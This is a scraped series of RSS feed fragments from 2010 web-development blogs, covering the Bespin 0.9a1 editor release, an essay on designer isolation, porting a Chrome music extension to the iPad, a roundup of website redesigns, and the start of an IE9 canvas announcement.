started.\n</p></blockquote>\n<p>Time to knuckle down and deliver great new video features in the browsers!</p>\n<div>\n<a href=\"http://feeds.feedburner.com/~ff/ajaxian?a=HAzL0cjotUQ:-gRXLRKMN2U:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/ajaxian?d=yIl2AUoC8zA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/ajaxian?a=HAzL0cjotUQ:-gRXLRKMN2U:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/ajaxian?d=7Q72WNTAKBA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/ajaxian?a=HAzL0cjotUQ:-gRXLRKMN2U:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/ajaxian?i=HAzL0cjotUQ:-gRXLRKMN2U:D7DqB2pKExk\" border=\"0\"></a>\n</div>"

      "content" : "<p><em>Bespin 0.9a1 features multiple Bespin instances, the start of code completion, simpler packaging and a curious new version number.</em></p>\n<h2><span></span>Multiple Bespins</h2>\n<p>Ever since we released the first Bespin Embedded, we’ve had requests on and off for the ability to have multiple Bespin editors on the page. When you factor in complexities around the plugin system, allowing multiple Bespins on a page is non-trivial. But, now multiple editors on the page works fine:</p>\n<div style=\"width:464px\"><a href=\"http://mozillalabs.com/bespin/files/2010/06/Multiple-Bespins.png\"><img title=\"Multiple Bespins\" src=\"http://mozillalabs.com/bespin/files/2010/06/Multiple-Bespins.png\" alt=\"\" width=\"454\" height=\"664\"></a><p>Multiple Bespins with command lines in white</p></div>\n<p>The screenshot above shows off multiple Bespins with two of the new features from Bespin 0.8 (the white theme and the ability to include the command line). A couple of interesting implementation notes: Bespin uses Charles Jolley’s <a href=\"http://github.com/sproutit/tiki\">Tiki</a> CommonJS module loader, which supports separate “sandboxes” of modules. The modules are downloaded from the server once, but each Bespin instance gets its own sandbox. That way, modules that store data in module-global variables will not get confused about which Bespin they’re working with. Settings and themes are shared between Bespin instances.</p>\n<h2>Code Completion</h2>\n<p>The other big new feature is one that is available today, but will become easier and smoother to use over time. Bespin can now do code completion, take a look at this screenshot for an example:</p>\n<div style=\"width:240px\"><a href=\"http://mozillalabs.com/bespin/files/2010/06/Code-Completion-in-Bespin.png\"><img title=\"Code Completion in Bespin\" src=\"http://mozillalabs.com/bespin/files/2010/06/Code-Completion-in-Bespin.png\" alt=\"\" width=\"230\" height=\"187\"></a><p>Code Completion Example</p></div>\n<p>As soon as you hit “.”, Bespin will try to figure out what is available on the object you’re accessing. That information is gathered up beforehand in the well-known <a href=\"http://ctags.sourceforge.net/\">ctags</a> format. We’re using the <a href=\"http://pcwalton.blogspot.com/2010/05/introducing-jsctags.html\">jsctags</a> project (from Bespin team member Patrick Walton) to generate the tags. Using jsctags, we’ll eventually be generating the tags right in your browser (that’s the “easier and smoother” part that’s coming in the future).</p>\n<h2>Simplification</h2>\n<p>Bespin 0.9a1 simplifies two things over 0.8. First, there is now just one downloadable “Bespin Embedded” package that combines the features of both the “Drop In” and “Customizable” packages that we offered in previous releases. You can download this one package and deploy the contents of the “prebuilt” directory to your server, and you’re all ready to go! If you need to go beyond that, you can make sure you have Python installed and customize away.</p>\n<p>The second thing we’ve simplified was the signature of “command” functions. A “command” in Bespin is basically any action you take in the editor or the command line. In versions prior to 0.9, commands took an “env” argument as the first parameter. With 0.9 onward, you should no longer include that parameter and instead just grab the “env” variable from the “environment” module.  There are more details of this change in the <a href=\"https://bespin.mozillalabs.com/docs/releases/notes09.html\">Bespin 0.9 Release Notes</a>. A new tutorial on making commands is coming today or tomorrow.</p>\n<h2>Version Numbering</h2>\n<p>To date, every release of Bespin has been an alpha release. With 0.9 (codenamed “Edison”), we’re switching to the kind of release cycles used by stable and mature projects. We’ll start with a series of alpha releases that are not yet feature complete. Then we’ll move to beta test releases to work out any kinks before having a final release. 0.9a1 is no more or less “alpha” than 0.8 was, but the version number reflects that we’re heading toward a stable state.</p>\n<h2>Download Bespin Now</h2>\n<p><a href=\"http://ftp.mozilla.org/pub/mozilla.org/labs/bespin/Embedded/BespinEmbedded-0.9a1.tar.gz\">Download Bespin Embedded 0.9a1</a>. Take a look at the full <a href=\"https://bespin.mozillalabs.com/docs/releases/notes09.html\">0.9 Release Notes</a> for more information about what’s new.</p>\n<p>Stay tuned for more interesting developments in Bespin this week.</p>\n<p>– <em>Kevin Dangoor, on behalf of the Bespin team</em></p>"

The downside of the digital revolution is isolation. The Web allows us to do alone what previously would have required a team of people. It also frees us from the constraints of geography, allowing us to work from home. But while these are benefits, they also leave us isolated.</p><p>[Offtopic: by the way, did you know that there is a Smashing eBook Series? Book #2 is <a href=\"https://shop.smashingmagazine.com/smashingbook-dispatcher.php?d=smashing-ebook-successful-freelancing\">Successful Freelancing for Web Designers</a>, 260 pages for just $9,90.]</p><h3>The Dangers Of Isolation</h3><p>Over time, working in isolation (even if you function as part of a team) can prove harmful to your mental health, business and website. In fact, even if other people are working on a project of yours, if they are junior to you, you can still feel isolated.</p><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/06/dog.jpg\" width=\"500\" height=\"383\" alt=\"Dog in Web Designers, Don’t Do It Alone\"><br> <em>lifeandlove, <a href=\"http://www.shutterstock.com/\">Shutterstock</a></em></p><p>If you don’t find a peer with whom you can share ideas and discuss your business or project, you face a number of dangers:</p><ul><li><strong>Dry up creatively</strong><br> Creativity is born of interaction. Being consistently creative on your own is hard. The best ideas come from people brainstorming together and from one great idea leading to another. Without someone to bounce ideas around with, your business or project will lack a creative spark.</li><li><strong>Lose confidence</strong><br> Over time we can lose confidence in our abilities or our business. This is especially true when we make mistakes and things go wrong. Without someone to encourage and reassure us, we can begin to second-guess our decisions.</li><li><strong>Become over-confident</strong><br> While some suffer from a lack of confidence, others are over-confident and need to be challenged and questioned. This is a trait I suffer from; I would happily dive headlong into disaster if my fellow directors did not constantly question my ideas. Without people like this, moving your business in entirely the wrong direction would be too easy.</li><li><strong>Reach the limit of your knowledge</strong><br> We can’t all be experts at everything, and yet running a website and a business requires a broad range of skills. When working in isolation and tackling problems beyond your comfort zone, you can easily reach the limit of your expertise and flounder.</li><li><strong>Have a blinkered perspective</strong><br> Another problem with working alone is that you have only a single perspective on your work. By adding another set of eyes to your problems, you gain a broader vision and can approach your challenges from a different angle.</li><li><strong>Feel overwhelmed</strong><br> Running a business or a business-critical website can feel like a burden. You are often required to make big decisions, particularly with hiring and expenditures. Making these decisions alone is a big responsibility and can be really scary. Having someone to share that with would make a big difference.</li></ul><p>So, can you identify with any of these traps? If not, then I suggest you read the one about over-confidence again! I don’t believe a single website owner or entrepreneur couldn’t benefit from an outside perspective.</p><p>The question, then, is how do you find someone?</p><h3>Getting An Outside Perspective</h3><p>The most obvious solution is to partner with somebody at the outset. Whether you work with someone on a website or form a business with an associate, partnerships can be very beneficial. This is what I did with our company, and I haven’t regretted it for a minute. I would be lost without my two co-founders, Chris and Marcus.</p><p>That said, I know that not everyone’s experiences with partners have been rosy. Also, by the time you read this, the opportunity for this kind of partnership may have already passed.</p><p>What can you do then? What other options are available to those seeking an outside perspective and someone to bounce ideas around with?</p><p>Here are some options:</p><ul><li><strong>Sleeping partner</strong><br> This is the approach we took. We have a non-executive director named Brian who works with a number of companies and keeps us on our toes. He has a radically different view of business and constantly challenges us. In return, he has a small stake in the business. He is worth every penny.</li><li><strong>Paid consultant</strong><br> If you don’t fancy having someone so entrenched in your business, why not consider an external consultant with whom you could speak on an ongoing basis? Admittedly, this kind of consultant can be pricey, but they do bring an outside perspective to the table.</li><li><strong>Mentor</strong><br> Another option is to approach a Web designer or website owner you admire and ask them to mentor you. Obviously, these people are probably busy with their own work, but if you are willing to pay for their time, you might get some valuable advice. You’ll usually need only an hour per month to stay on the right track.</li><li><strong>Buddy</strong><br> A buddy would be a cheaper option, someone in a situation similar to yours. The two of you could agree to chat regularly and share the challenges you face as business or website owners, discussing different approaches and ideas.</li><li><strong>Community</strong><br> Yet another option would be to look not for a consultant, mentor or buddy, but for a supportive online community. Loads are around, but make sure the one you join is not too big. You want people to remember you and your circumstances.</li></ul><p>Whatever you decide is entirely up to you. The point is, if you want to realize the potential of your website or business, you need the help and encouragement of others. Humans by nature work best in groups, and you are no exception. We are not meant to do it alone!</p><p><em>(al)</em></p><hr><p><small>© Paul Boag for <a href=\"http://www.smashingmagazine.com\">Smashing Magazine</a>, 2010. | <a href=\"http://www.smashingmagazine.com/2010/06/27/dont-do-it-alone/\">Permalink</a> | <a href=\"http://www.smashingmagazine.com/2010/06/27/dont-do-it-alone/#comments\">Post a comment</a> | <a title=\"Bookmark in del.icio.us\" href=\"http://del.icio.us/post?url=http://www.smashingmagazine.com/2010/06/27/dont-do-it-alone/&amp;title=Web%20Designers,%20Don%E2%80%99t%20Do%20It%20Alone\">Add to del.icio.us</a> | <a title=\"Bookmark in Digg\" href=\"http://digg.com/submit?phase=2&amp;url=http://www.smashingmagazine.com/2010/06/27/dont-do-it-alone/\">Digg this</a> | <a title=\"Stumble on StumbleUpon\" href=\"http://www.stumbleupon.com/submit?url=http://www.smashingmagazine.com/2010/06/27/dont-do-it-alone/\">Stumble on StumbleUpon!</a> | <a title=\"Tweet us!\" href=\"http://twitter.com/home?status=@tweetmeme%20@smashingmag%20Reading%20&#39;Web%20Designers,%20Don%E2%80%99t%20Do%20It%20Alone&#39;%20http://www.smashingmagazine.com/2010/06/27/dont-do-it-alone/\">Tweet it!</a> | <a title=\"Bookmark in Reddit\" href=\"http://reddit.com/submit?url=http://www.smashingmagazine.com/2010/06/27/dont-do-it-alone/\">Submit to Reddit</a> | <a href=\"http://forum.smashingmagazine.com/\">Forum Smashing Magazine</a><br> Post tags: <a href=\"http://www.smashingmagazine.com/tag/isolation/\" rel=\"tag\">isolation</a>, <a href=\"http://www.smashingmagazine.com/tag/workflow/\" rel=\"tag\">Workflow</a><br> </small></p>"

The post hit home with me as the founder of a web-based application that is as much 'app-like' as it is 'web-like'. The promise of the web, and HTML5 in particular, is that we will finally reach the write-once, run-anywhere dream we have all been in search of that neither Java nor Flash could fully deliver. Dion poses this question (and answer) towards the end of the post - <em>'As a developer, do you want to port experiences between incredibly varied platforms such as Web, iPhone, Android, WinPho 7, RIM, Kindle SDK, [insert many others!]? No.'</em>.  I don't think many developers would argue with Dion's answer. The real question is - 'Are we there yet?'</p>\n<p>My company is developing a client-centric web-based music player that cuts no corners in its attempt to look, feel and run like a native application. We threw progressive enhancement out the door, pushed the pedal to the HTML5 metal and created something that most people would be hard-pressed to believe is not a native application if they didn't already see it running inside the browser. However, there is a catch. Our application only runs inside Chrome. This was of course by design. We built it as a Chrome extension. We didn't choose to do this because we wanted to restrict it to Chrome. We did this because a large part of the functionality of our application needs the extra APIs and permissions an extension gives you. A nice side-effect of that is we know 100% of our users are using an HTML5 capable browser. Chrome extensions are 100% HTML(5), CSS(3) and Javascript. Extensions provide extra Javascript APIs that give you access to functionality that you otherwise would not have running as a website such as removing security restrictions on cross-domain xhr and requiring permission to display desktop notifications. Of the thousands of lines of code in our extension, only 5% of it is Chrome specific. In theory, this should make porting to other browsers and OS's easy. Let's see what it looks like in practice.</p>\n<p>A few months ago, we decided to see what our application would look like on the iPad. After just four hours, we had a working prototype of our music player that looked and felt native but more importantly looked and felt exactly like our Chrome extension. This was possible because Chrome and Safari share the same rendering engine - Webkit. Mobile Safari has already implemented many of the HTML5 features we needed such as HTML5 Audio, Web Database and Local Storage and many of the CSS3 features we needed such as Background Gradients, Rounded Corners and Box-Shadows. We were able to re-use most of our Javascript code and since we used a lot of CSS in place of images, we were able to resize elements with ease. But a prototype is just a prototype. Could our web-application actually be a viable shipping product on the iPad?</p>\n<p>At this point, the answer is no. Mobile Safari has two quirks that seriously hamper its ability to act as a web platform. The first is it's lack of fixed positioning. If there was one feature that defined native applications vs. web applications it would be that native applications almost always frame content with a top and bottom layer of buttons or displays. Think about iPhone apps. Almost every one of them (minus games) has a navigation layer on top and a series of buttons on the bottom. To pull this off as a web-application, you need fixed positioning. Unfortunately, Mobile Safari (as well as Android's browser) do not provide this feature. There are many hacks to emulate it though. Apple has even developed a Javascript/CSS framework to get around this themselves. For our iPad web-app, we used a library called <a href=\"http://github.com/davidaurelio/TouchScroll\">TouchScroll</a> that uses Javascript and CSS animations to emulate scrolling. Overall, the lack of fixed positioning is not a game-ender, as hacks are available, but it certainly adds a layer of complexity to building a client-centric web-app that will make many developers' lives more difficult. The next quirk may just be a game-ender. Mobile Safari on the iPhone and iPad has an annoying ability to refresh windows once you open up a few. So say you have a few windows open including our music player. The music player is not the active window however. When you click back on it to make it active, it refreshes. I'm not sure why this happens although my guess is it has something to do with memory management. Either way, most apps (especially music or video ones) cannot be taken seriously if the application is constantly refreshing. Sure, in theory applications could maintain their state between refreshes. But in practice, this never works quite as well as we'd like it to. Of course, music stopping and starting constantly will be a game-ender. I am hoping that the iPhone 4 with its 512MB RAM does not have this issue. Android does not seem to suffer from this but Android does not support HTML5 Audio or Video so it certainly has drawbacks of its own. </p>\n<p>A couple of weeks ago, Safari 5 was introduced with support for extensions. We spent a few hours reading the documentation to see what it would take to port our extension from Chrome to Safari. Unlike Firefox, where extensions are a bit more than just HTML/CSS/JS and support for HTML5 features are lagging, Safari extensions are theoretically similar to Chrome. Other than different Javascript APIs, the functionality offered is almost exactly the same. We determined that it would not be too difficult to port. Of course, business decisions are not always just about technology, so we are waiting a bit before we do just that. It will however, be very interesting to see if Apple brings extension support to Mobile Safari on iOS. </p>\n<p><a href=\"http://ajaxian.com/wp-content/images/screen_popover.png\"><img src=\"http://ajaxian.com/wp-content/images/screen_popover.png\" alt=\"\" title=\"full size image\" width=\"460\"></a></p>\n<p>Coming back to Dion's original post, it seems like we are closer to write-once, run-anywhere using client-centric web-based applications than we have ever been. With a few modifications, we can basically re-use 80% of our code to deploy on the desktop and mobile. Unfortunately, not all browsers are there yet though. The issues I listed above seem like minor ones that can be fixed easily however. It would not surprise me if in the second half of 2010, Mobile Safari fixes the refreshing issue and Android adds support for HTML5 Audio/Video. As more frameworks are released that deal with the fixed positioning problem, I expect more developers to look seriously at the web as their platform of choice for deploying mobile applications. As for the desktop, Firefox 4 and IE9 should finally add the HTML5 and CSS3 feature support that Chrome and Safari have had for a while now. Of course, not all users will have the latest and greatest browser. Progressive enhancement will be the only way to support those users. But by pushing the envelope of what's possible, we will hopefully push those users towards upgrading to a modern browser.</p>\n<p>For a 60 second run through of ExtensionFM, check out the video below:</p>\n<p><iframe src=\"http://reader.googleusercontent.com/reader/embediframe?src=http://www.youtube.com/v/-6EtraV_TIQ%26hl%3Den_US%26fs%3D1%26&amp;width=640&amp;height=385\" width=\"640\" height=\"385\"></iframe></p>\n<div>\n<a href=\"http://feeds.feedburner.com/~ff/ajaxian?a=mEU4-x-acl4:inl7uwJoo1U:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/ajaxian?d=yIl2AUoC8zA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/ajaxian?a=mEU4-x-acl4:inl7uwJoo1U:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/ajaxian?d=7Q72WNTAKBA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/ajaxian?a=mEU4-x-acl4:inl7uwJoo1U:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/ajaxian?i=mEU4-x-acl4:inl7uwJoo1U:D7DqB2pKExk\" border=\"0\"></a>\n</div>"

Others are so complete you have to double-check and  make sure you’ve landed on the right website.</p>\n<p>Remember that keeping some elements consistent from your old design  to your new one can aid visitors in knowing they’ve arrived at the right  place. Otherwise, they might assume your company has been bought out or  closed and the domain has been taken over by someone else.</p>\n<p>Below are <strong>thirteen awesome redesigns</strong> from the past year or so… Each one also has some in-depth  analysis of what’s been changed and what hasn’t, and the effect that they may  have on the site’s visitors.<span></span></p>\n<h1>Google</h1>\n<p><a href=\"http://www.google.com/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/website_redesigns/google-old.jpg\" alt=\"\"></a></p>\n<p><a href=\"http://www.google.com/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/website_redesigns/google-new.jpg\" alt=\"\"></a></p>\n<p>Google has rarely made design changes to their website (with the  exception of their iGoogle personalized home page). But this month  they’ve given users the option to use a custom background image.</p>\n<p>Users  can choose from a variety of images, including their own Picasa images.  Another big change with this new design is the logo: it now appears in  white rather than the multi-color version we’re all so familiar with.</p>\n<p>Google has kept everything else about the page pretty much the same,  though. The links across the top are the same, the layout is identical  (other than the “Change background image” link in the bottom left), and  the language used on the page is unchanged. This gives visitors a sense  of continuity with the new background designs.</p>\n<p>One question begs to be  asked, though: is the new Google background image option a response to  the design of Microsoft’s Bing search engine (which uses scenic  background images, similar to the one shown in Google’s new design)?</p>\n<p><br></p>\n<h1>N.Design Studio</h1>\n<p><a href=\"http://www.ndesign-studio.com/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/website_redesigns/ndesignstudio-old.jpg\" alt=\"\" width=\"615\" height=\"475\"></a></p>\n<p><a href=\"http://www.ndesign-studio.com/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/website_redesigns/ndesignstudio-new.jpg\" alt=\"\" width=\"615\" height=\"500\"></a></p>\n<p>N.Design Studio has always had incredibly artistic, eye-catching  designs for their website and blog. The multi-colored phoenix in their  last design has been featured in countless web design posts and design  galleries. And no wonder: it’s beautiful. But it seems like everyone has  seen it at least a dozen times, whether they frequent the N.Design site  or not.</p>\n<p>So Nick La made some updates, this time with an illustrated Koi fish  and textured background. Even the logo is different.</p>\n<p>For a design site,  this kind of massive redesign can work well, showing off a designer’s  evolution and new talents. With non-design websites, though, keeping at  least some elements similar or identical keeps returning visitors from  wondering whether they’ve landed on the wrong site (or wondering if the site  they’ve come to trust has been bought out or replaced by someone  else).</p>\n<p><br></p>\n<h1>Veerle’s Blog 3.0</h1>\n<p><a href=\"http://veerle.duoh.com/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/website_redesigns/veerle-old.jpg\" alt=\"\"></a></p>\n<p><a href=\"http://veerle.duoh.com/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/website_redesigns/veerle-new.jpg\" alt=\"\"></a></p>\n<p>Veerle’s Blog has undergone a massive redesign, with a new color  scheme, typography and layout.</p>\n<p>The new design is softer and a bit more  elegant than the old design. Especially interesting is the new  categorization of posts: Graphic &amp; Web Design, Modern Home Design,  and Belgian Graphic Design. The old design had a lot more categories,  along with a more cluttered look.</p>\n<p>The illustration in the header is different from one design to the  next, but if you look closely you’ll see it’s the same woman, just with  an updated haircut. This lends consistency between the new version and  the old one, while still allowing for a complete aesthetic overhaul.  Both designs also used a lot of bright accent colors, though in  different ways.</p>\n<p><br></p>\n<h1>DelCastillo</h1>\n<p><a href=\"http://www.delcastillo.com.gt/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/website_redesigns/delcastillo-old.jpg\" alt=\"\"></a></p>\n<p><a href=\"http://www.delcastillo.com.gt/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/website_redesigns/delcastillo-new.jpg\" alt=\"\"></a></p>\n<p>DelCastillo went from a traditional website design to a  magazine-style format, with different posts having entirely different  designs.</p>\n<p>This is one of the most extreme redesigns on this list, and  each post almost acts as a new design in itself. Another interesting  feature of the new design is that the most recent post’s design also  serves as the home page design, something not often seen with this type  of blog.</p>\n<p>The typography between the old blog and the new one is similar, with  the main header only changing slightly other than the increase in size.  Overall, it’s a very comprehensive redesign, with the new site bearing  little resemblance to the old one.</p>\n<p><br></p>\n<h1>Light CMS</h1>\n<p><a href=\"http://cssmayo.com/light-cms/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/website_redesigns/lightcms-old.jpg\" alt=\"\"></a></p>\n<p><a href=\"http://www.speaklight.com/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/website_redesigns/lightcms-new.jpg\" alt=\"\"></a></p>\n<p>LightCMS’s new website has a much cleaner, more minimalist design  than their previous site, which used a textured background, hand-drawn  elements, and lots of icons. The new design has a clean white  background, minimal icons, and a much more streamlined design.</p>\n<p>The header layout remains similar between the two designs, though the  rest of the navigation elements have been updated.</p>\n<p>The logo is also the  same, though the proportion of the circle to the type has changed  slightly and they’ve gotten rid of the drop shadow (all of which have  strengthened the site’s branding). Overall, the new design gives the  impression of a much more sophisticated and established company.</p>\n<p><br></p>\n<h1>BrightKite</h1>\n<p><a href=\"http://cssmayo.com/brightkite/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/website_redesigns/brightkite-old.jpg\" alt=\"\"></a></p>\n<p><a href=\"http://brightkite.com/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/website_redesigns/brightkite-new.jpg\" alt=\"\"></a></p>\n<p>BrightKite’s website has undergone a really fantastic redesign.  They’ve kept a lot of the same elements while also giving it an entirely  new look. Things they kept include the color scheme, the cartoon  characters, and their logo.</p>\n<p>The overall layout has changed significantly, though. They’ve also  gotten rid of the heavy, dark blue background in favor of a much lighter  version.</p>\n<p>The cartoon characters in the new version are much better  integrated into the overall design, as is the Facebook Connect icon.  They’ve also taken up space on the home page with testimonials,  something that was missing in the first design.</p>\n<p>And they’ve added a link  to their Android app in addition to the iPhone app. It’s a much  cleaner, more polished looking design than the original.</p>\n<p><br></p>\n<h1>Sushi  and Robots</h1>\n<p><a href=\"http://www.trendslab.cn/wordpress-themes/37%E4%B8%AA%E4%BC%98%E7%A7%80%E5%8D%9A%E5%AE%A2blog%E8%AE%BE%E8%AE%A1wordpress-theme-%E4%BF%AE%E6%94%B9%E5%8F%82%E8%80%83\"><img src=\"http://netdna.webdesignerdepot.com/uploads/website_redesigns/sushiandrobots-old.jpg\" alt=\"\"></a></p>\n<p><a href=\"http://sushiandrobots.com/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/website_redesigns/sushiandrobots-new.jpg\" alt=\"\"></a></p>\n<p>Sushi and Robots has one of the more subtle redesigns on this list.  They’ve kept their typography almost identical, which lends consistency  between the designs.</p>\n<p>The new design has dropped the white background in  favor of a paper texture with a subtle grid. The robot and girl  illustration has also been replaced with a changing featured  illustration.</p>\n<p>The design has also been changed over from a two-column design to a  grid design, with content areas of varying sizes. The dark footer also  adds a bit more contrast to the new design.</p>\n<p>The navigation options in  the header have been changed slightly, too, and streamlined quite a bit.  The biggest improvement though, is definitely in the grid design,  especially when combined with that subtle background.</p>\n<p><br></p>\n<h1>31Three</h1>\n<p><a href=\"http://picasaweb.google.com/lh/photo/hZxDM89vFT7LO0RXfq5JyQ\"><img src=\"http://netdna.webdesignerdepot.com/uploads/website_redesigns/31three-old.jpg\" alt=\"\"></a></p>\n<p><a href=\"http://www.31three.com/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/website_redesigns/31three-new.jpg\" alt=\"\"></a></p>\n<p>31Three made drastic changes to their layout, but kept a number of  design elements constant between the old version and the new one.</p>\n<p>The  logo has been tweaked a bit, with a condensed version of the same  typeface, which is repeated throughout the design. He also kept  butterflies as a constant element between the two, though the newer  design uses them in a different way. The new home page is also much more  scannable than the old one, and has a lighter feel to it.</p>\n<p>The color scheme has been adjusted, but is very similar between the  two designs (the new one is a bit more muted). The new design seems  infinitely more polished than the old one, though, which is accentuated  by the glass bottle and the circular graphics.</p>\n<p><br></p>\n<h1>Carbonmade</h1>\n<p><a href=\"http://infotangle.blogsome.com/2007/04/02/information-design-for-the-new-web/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/website_redesigns/carbonmade-old.jpg\" alt=\"\"></a></p>\n<p><a href=\"http://carbonmade.com/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/website_redesigns/carbonmade-new.jpg\" alt=\"\"></a></p>\n<p>The new Carbonmade site is quite a bit different from the old one.  They’ve updated their logo to a more detailed version, though the basic  idea stays the same. They’ve also gotten rid of the heavy black content  area on their home page in favor of a more inviting and relaxing  illustrated mountain.</p>\n<p>The mountain becomes the focal point of the home page, helping to  illustrate the information they offer.</p>\n<p>They’ve also added a number of  other illustrated characters to highlight important parts of the site  (like the “Sign-up” button). The light blue color has been carried over  from the original design to the new one, which reassures visitors that  they’re on the correct site.</p>\n<p>They’ve also de-emphasized the “demo”  button in favor of making the “Sign-up” button much more prominent.</p>\n<p><br></p>\n<h1>Buffalo</h1>\n<p><a href=\"http://www.danielevsilva.com.br/minimalismo/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/website_redesigns/buffalo-old.jpg\" alt=\"\"></a></p>\n<p><a href=\"http://www.builtbybuffalo.com/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/website_redesigns/buffalo-new.jpg\" alt=\"\"></a></p>\n<p>The new Buffalo website is a huge improvement over the old one (which  was already a great design). The addition of the green bar across the  top, as well as more green used throughout the typography in the design  has given it a much more modern and inviting feeling than the original  had.</p>\n<p>The new design is still based on a grid, but they’ve changed it up a  bit, varying the size of the content areas, which gives it a much more  relaxed feeling.</p>\n<p>The reduced size of the navigation links in the header  also opens things up substantially. The images used at the bottom, which  talk about water buffalo, only add even more to the kicked-back style  of Buffalo.</p>\n<p><br></p>\n<h1>Larva Labs</h1>\n<p><a href=\"http://cssmayo.com/larva-labs/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/website_redesigns/larvalabs-old.jpg\" alt=\"\"></a></p>\n<p><a href=\"http://www.larvalabs.com/index.php\"><img src=\"http://netdna.webdesignerdepot.com/uploads/website_redesigns/larvalabs-new.jpg\" alt=\"\"></a></p>\n<p>Larva Labs has used the same background image in their new design as  they did in the old one, but has repositioned it to give it a more  central role in the design.</p>\n<p>They’ve also updated their logo into  something much more modern, and have better compartmentalized their  content for a more organized and polished look.</p>\n<p>Adding more formal navigation links at the top have also added to the  professionalism of the site. The color scheme has stayed very similar,  though, and combined with the same background image, there’s no  mistaking that they’re the same company from one design to the next.</p>\n<p><br></p>\n<h1>Olliekav.com</h1>\n<p><a href=\"http://v1.olliekav.com/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/website_redesigns/olliekav-old.jpg\" alt=\"\"></a></p>\n<p><a href=\"http://www.olliekav.com/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/website_redesigns/olliekav-new.jpg\" alt=\"\"></a></p>\n<p>Ollie Kavanagh’s site has undergone a substantial facelift. The old  design was grungy and dark, while the new design is streamlined and  light.</p>\n<p>One of the coolest things is that he’s kept a link to the old  design for those who preferred it. What you can’t see here is that each  page on the new design uses a different background color, though the  rest of the design remains the same.</p>\n<p>Almost everything about the site  has been overhauled, with cleaner typography, fewer images, and even the  logo. The logo in particular is of interest, as he’s taken the cleaner,  graffiti-inspired logo from the grunge design (which was arguably the  cleanest part of the old design) and morphed it into a slightly  different shape with a more traditional dripping graffiti look, which  contrasts nicely with the simplicity of the rest of the design.</p>\n<p><br></p>\n<h1>The Design Cubicle</h1>\n<p><a href=\"http://konigi.com/notebook/collection-inspirational-website-collections\"><img src=\"http://netdna.webdesignerdepot.com/uploads/website_redesigns/thedesigncubicle-old.jpg\" alt=\"\"></a></p>\n<p><a href=\"http://www.thedesigncubicle.com/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/website_redesigns/thedesigncubicle-new.jpg\" alt=\"\"></a></p>\n<p>The first thing that strikes you about the new Design Cubicle design  is that it’s a lot brighter and has a lot fewer elements than the old  design.</p>\n<p>The original Design Cubicle site had a three-column design, and  each column was filled to the hilt with content. While it was laid out  well and managed to stay relatively uncluttered looking, it could be a  bit overwhelming.</p>\n<p>The new design, on the other hand, has much cleaner lines and has  dropped most of the content in the sidebars. Now, there’s just the  comment information for each post in the left-hand sidebar, and the  right-hand one just has links to the archives.</p>\n<p>The center column has an  aesthetically-pleasing gray background, which makes for excellent  readability. Overall, it’s one of the nicest redesigns on this list, and  will almost certainly continue to look fresh for years to come.</p>\n<p><br></p>\n<p><em>Written exclusively for WDD by <a href=\"http://twitter.com/cameron_chapman\">Cameron Chapman</a>.</em></p>\n<p><em><strong>If you’ve seen any other great redesigns in recent months, please  let us  know in the comments below…</strong></em></p>\n\n<p><br>If you find an exclusive RSS freebie on this feed or on the live WDD website, please use the following code to download it: H0Oa9C</p>\n<p><iframe src=\"http://feedads.g.doubleclick.net/~ah/f/ng80slqo6cepue6lo9t5b2mkbg/468/60#http%3A%2F%2Fwww.webdesignerdepot.com%2F2010%2F06%2Fawesome-recent-website-redesigns%2F\" width=\"100%\" height=\"60\" frameborder=\"0\" scrolling=\"no\" marginwidth=\"0\" marginheight=\"0\"></iframe></p><img src=\"http://feeds.feedburner.com/~r/webdesignerdepot/~4/bjnbTLvEGjA\" height=\"1\" width=\"1\">"

My canvas crusade is done. <a href=\"http://blogs.msdn.com/b/ie/archive/2010/06/23/html5-native-third-ie9-platform-preview-available-for-developers.aspx\">IE9 is supporting canvas, and it is hardware accelerated</a>, in the third preview release:</p>\n<blockquote><p>\nWith the third platform preview, we introduce support for the HTML5 Canvas element. As you know our approach for standards support is informed both by developer feedback and real word usage patterns today, along with where we see the web heading. Many web developers have asked us to support this part of HTML5 and we definitely took this feedback into account as we prioritized our work.</p>\n<p>Like all of the graphics in IE9, canvas is hardware accelerated through Windows and the GPU. Hardware accelerated canvas support in IE9 illustrates the power of native HTML5 in a browser. We’ve rebuilt the browser to use the power of your whole PC to browse the web. These extensive changes to IE9 mean websites can now take advantage of all the hardware innovation in the PC industry.</p>\n<p>Preview 3 completes the media landscape for modern websites with hardware accelerated video, audio, and canvas. Developers now have a comprehensive platform to build hardware accelerated HTML5 applications. This is the first browser that uses hardware acceleration for everything on the web page, on by default, available today for developers to start using for their modern site development.</p>\n<p><img src=\"http://ieblog.members.winisp.net/images/Dean_PPB3_3.png\" width=\"460\"></p>\n<p>The third platform preview continues to support more of DOM and CSS3 standards that developers want. Examples here include DOM 